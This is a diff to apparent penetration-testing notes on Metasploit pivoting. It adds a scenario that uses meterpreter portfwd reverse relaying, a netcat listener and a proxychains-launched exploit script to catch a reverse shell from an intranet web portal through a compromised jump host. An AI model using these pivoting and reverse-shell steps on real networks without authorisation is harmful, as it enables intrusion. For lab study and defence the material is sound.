@@ -1,4 +1,4 @@
-# Metasploit Tunneling for exploitation
+# Metasploit Port Tunneling for exploitation
 
 ## Scenario 1: 
 - The service of my target machine (10.10.1.10) is serving only at lo interface at 127.0.0.1:3306. It does not serve at 0.0.0.0:3306.
@@ -70,3 +70,33 @@ ProxyChains-3.1 (http://proxychains.sf.net)
 ...
 ```
 We have more flexibility with what tools to use with this Socks proxy set up. 
+
+## Scenario 3:
+- I have gained access to intranet admin web portal (172.16.1.2:80) via my exploited jump host (10.10.1.10 or 172.16.1.10) via Scenario 2.
+- I found a vulnerability on 172.16.1.2:80
+- I want to get a reverse connection back to my host machine (10.10.1.32) via tunneling through jump host at 172.16.1.10:4444.
+
+Technique: portfwd reverse forwarding
+
+```
+msf6 post(multi/manage/sudo) > sessions -i 2
+[*] Starting interaction with 2...
+
+meterpreter > portfwd list
+
+No port forwards are currently active.
+
+meterpreter > portfwd add -R -L 10.10.1.32 -l 4443 -p 4444
+[*] Reverse TCP relay created: (remote) :4444 -> (local) 10.10.1.32:4443
+
+meterpreter > background
+
+(host)# nc -nlvp 4443
+```
+portfwd is a meterpreter feature that supports relaying. We specify `-R` for reverse relaying. The `-L` option is the IP of host machine and `-l` is our netcat listener while `-p` will open a listening port on our jump host at `0.0.0.0:4444`.
+
+```
+(host)# proxychains exploit.sh --lhost=172.16.1.10 --lport=4444
+```
+We trigger our reverse shell to connect to our jumphost at 172.16.1.0:4444 which will get relayed back to our host's netcat. 
+
